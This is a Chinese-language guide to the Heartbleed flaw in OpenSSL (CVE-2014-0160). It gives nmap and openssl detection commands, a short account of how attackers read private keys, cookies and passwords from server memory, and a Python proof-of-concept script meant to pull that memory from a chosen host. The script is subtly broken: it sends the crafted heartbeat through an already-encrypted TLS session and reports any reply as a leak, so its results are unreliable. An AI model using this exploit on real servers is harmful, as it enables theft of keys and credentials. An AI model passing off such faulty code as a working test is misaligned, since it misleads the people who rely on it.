验证漏洞存在方法
    - 使用nmap脚本检测：`nmap -p 443 --script ssl-heartbleed <target>`
    - 使用openssl命令手动测试：`openssl s_client -connect <target>:443 -tlsextdebug 2>&1 | grep -i "heartbeat"`
    - 使用专门的Heartbleed检测工具如ssltest.py

漏洞利用方法
    - Heartbleed漏洞允许攻击者通过发送特制的TLS Heartbeat Extension数据包，读取服务器内存中的敏感信息
    - 攻击者可以读取私钥、会话cookie、密码等敏感数据
    - 漏洞存在于OpenSSL的TLS/DTLS心跳扩展处理中，由于缺少边界检查导致缓冲区越界读取

PoC示例代码：
```python
#!/usr/bin/python
# Heartbleed PoC (CVE-2014-0160)
import socket
import ssl
import struct
import sys

def heartbleed_poc(host, port=443):
    try:
        # 创建SSL上下文
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        # 建立SSL连接
        sock = socket.create_connection((host, port))
        ssl_sock = context.wrap_socket(sock, server_hostname=host)
        
        # 构造恶意心跳包
        # TLS心跳扩展类型：0x0F
        # 长度字段：0x4000 (16384字节)
        heartbeat = b'\x18\x03\x02\x00\x03\x01\x40\x00'
        
        # 发送心跳请求
        ssl_sock.send(heartbeat)
        
        # 接收响应
        response = ssl_sock.recv(16384)
        
        if len(response) > 0:
            print(f"[+] {host}:{port} 可能存在Heartbleed漏洞")
            print(f"[+] 响应长度: {len(response)} 字节")
            # 尝试解析响应中的内存数据
            if len(response) > 7:
                print("[+] 可能泄露的内存数据（前100字节）:")
                print(response[:100].hex())
        else:
            print(f"[-] {host}:{port} 可能不受影响")
            
        ssl_sock.close()
        sock.close()
        
    except Exception as e:
        print(f"[-] 错误: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法: python heartbleed_poc.py <host> [port]")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    heartbleed_poc(host, port)
```
